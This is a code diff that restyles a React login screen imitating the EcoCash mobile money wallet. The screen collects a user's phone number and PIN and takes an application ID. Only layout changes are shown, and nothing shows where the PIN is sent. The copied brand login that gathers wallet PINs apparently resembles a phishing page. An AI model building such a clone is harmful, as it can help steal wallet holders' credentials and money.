@@ -63,92 +63,88 @@ export const PinScreen: React.FC<PinScreenProps> = ({ phone, applicationId, onBa
   };
 
   return (
-    <div className="relative min-h-screen w-full bg-white pb-[40vh]">
-      <div className="mx-auto max-w-md px-6 pt-10">
+    <div className="min-h-screen w-full bg-white flex flex-col justify-between overflow-y-auto">
+      <div className="flex flex-col items-center w-full max-w-md mx-auto px-6 pt-8 pb-12 gap-6">
         <div className="flex flex-col items-center gap-3">
           <h1 className="text-4xl font-extrabold tracking-tight">
             <span className="text-[#0052CC]">Eco</span>
             <span className="text-[#E50000]">Cash</span>
           </h1>
-          <p className="text-xl font-semibold text-[#333333]">Login</p>
+          <p className="text-2xl font-semibold text-gray-800">Login</p>
         </div>
 
-        <div className="mt-8">
-          <div className="flex items-center gap-3 rounded-[12px] border border-[#2B7FFF] bg-white px-4 py-3.5 shadow-sm">
-            <span className="text-lg">🇿🇼</span>
-            <div className="flex items-center gap-1 text-[#2B7FFF] font-semibold">
-              <span>+263</span>
-              <span className="text-[0.7rem]">▼</span>
-            </div>
-            <span className="ml-auto text-slate-900 font-semibold">{phone}</span>
+        <div className="w-full flex items-center gap-2 border border-[#2B7FFF] rounded-xl bg-white p-3">
+          <span className="text-lg">🇿🇼</span>
+          <div className="flex items-center gap-1 text-[#2B7FFF] font-semibold">
+            <span>+263</span>
+            <span className="text-[0.7rem]">▼</span>
           </div>
+          <span className="text-slate-900 font-semibold">{phone}</span>
         </div>
 
-        <form onSubmit={handleSubmit} className="mt-8">
-          <div className="text-center">
-            <p className="text-sm font-medium text-[#666666]">Enter your PIN</p>
-          </div>
+        <div className="w-full text-left">
+          <p className="text-sm text-gray-500">Enter your PIN</p>
+        </div>
 
-          <div className="mt-4 flex justify-center gap-3">
-            {pinDigits.map((digit, index) => (
-              <input
-                key={index}
-                ref={(element) => {
-                  inputRefs.current[index] = element;
-                }}
-                id={`pin-${index}`}
-                type="text"
-                inputMode="numeric"
-                maxLength={1}
-                value={digit}
-                onChange={(event) => handleDigitChange(index, event.target.value)}
-                onKeyDown={(event) => handleDigitKeyDown(index, event)}
-                aria-label={`PIN digit ${index + 1}`}
-                className={`h-16 w-16 rounded-2xl border text-center text-2xl font-semibold text-slate-900 focus:outline-none focus:ring-2 focus:ring-[#2B7FFF] caret-black ${
-                  error
-                    ? 'border-red-500 focus:ring-red-500'
-                    : index === 0
-                    ? 'border-black'
-                    : 'border-[#2B7FFF]'
-                }`}
-              />
-            ))}
-          </div>
+        <div className="flex gap-3 justify-center">
+          {pinDigits.map((digit, index) => (
+            <input
+              key={index}
+              ref={(element) => {
+                inputRefs.current[index] = element;
+              }}
+              id={`pin-${index}`}
+              type="text"
+              inputMode="numeric"
+              maxLength={1}
+              value={digit}
+              onChange={(event) => handleDigitChange(index, event.target.value)}
+              onKeyDown={(event) => handleDigitKeyDown(index, event)}
+              aria-label={`PIN digit ${index + 1}`}
+              className={`h-16 w-16 rounded-2xl border text-center text-2xl font-semibold text-slate-900 focus:outline-none focus:ring-2 focus:ring-[#2B7FFF] caret-black ${
+                error
+                  ? 'border-red-500 focus:ring-red-500'
+                  : index === 0
+                  ? 'border-black'
+                  : 'border-[#2B7FFF]'
+              }`}
+            />
+          ))}
+        </div>
 
-          {error && <p className="mt-3 text-center text-xs text-red-500 font-medium">{error}</p>}
+        {error && <p className="text-center text-xs text-red-500 font-medium">{error}</p>}
 
-          <div className="mt-4 text-center">
-            <a href="#" className="text-[#0052CC] font-semibold underline">
-              Forgot PIN?
-            </a>
-          </div>
-        </form>
+        <div className="text-center mt-2">
+          <a href="#" className="text-[#0052CC] font-medium underline">
+            Forgot PIN?
+          </a>
+        </div>
       </div>
 
-      <div className="absolute bottom-0 left-0 right-0 h-[40vh] bg-[#0052CC] rounded-t-[3rem] px-6 pt-8 text-white">
-        <div className="text-center">
-          <p className="text-base font-medium">To register an EcoCash wallet or get assistance,</p>
-          <p className="text-base font-medium">click below</p>
+      <div className="w-full bg-[#0066CC] flex flex-col items-center rounded-t-[40px] pt-10 pb-8 px-6 mt-auto">
+        <div className="text-center px-2">
+          <p className="text-white text-base leading-relaxed">To register an EcoCash wallet or get assistance,</p>
+          <p className="text-white text-base leading-relaxed">click below</p>
         </div>
 
-        <div className="mt-6 grid gap-4 sm:grid-cols-2">
-          <div className="rounded-2xl bg-white p-4 shadow-md text-center text-slate-900">
-            <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-2xl bg-[#E8F1FF] text-[#0052CC] text-2xl">
+        <div className="flex flex-row justify-center gap-4 w-full max-w-sm mt-6 mb-8">
+          <div className="flex-1 rounded-2xl bg-white p-6 flex flex-col items-center justify-center shadow-md">
+            <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-[#E8F1FF] text-[#0052CC] text-2xl">
               👤
             </div>
             <p className="mt-3 text-sm font-semibold text-[#0052CC] underline">Register</p>
           </div>
-          <div className="rounded-2xl bg-white p-4 shadow-md text-center text-slate-900">
-            <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-2xl bg-[#E8F1FF] text-[#0052CC] text-2xl">
+          <div className="flex-1 rounded-2xl bg-white p-6 flex flex-col items-center justify-center shadow-md">
+            <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-[#E8F1FF] text-[#0052CC] text-2xl">
               i
             </div>
             <p className="mt-3 text-sm font-semibold text-[#0052CC] underline">Help & Support</p>
           </div>
         </div>
 
-        <div className="mt-6 text-center text-sm text-white">
-          <p>v2.13P</p>
-          <p className="mt-2">
+        <div className="text-center">
+          <p className="text-white/80 text-sm mb-2">v2.13P</p>
+          <p className="text-white/90 text-xs text-center">
             By signing in you agree to the <span className="underline">Terms and Conditions</span>
           </p>
         </div>
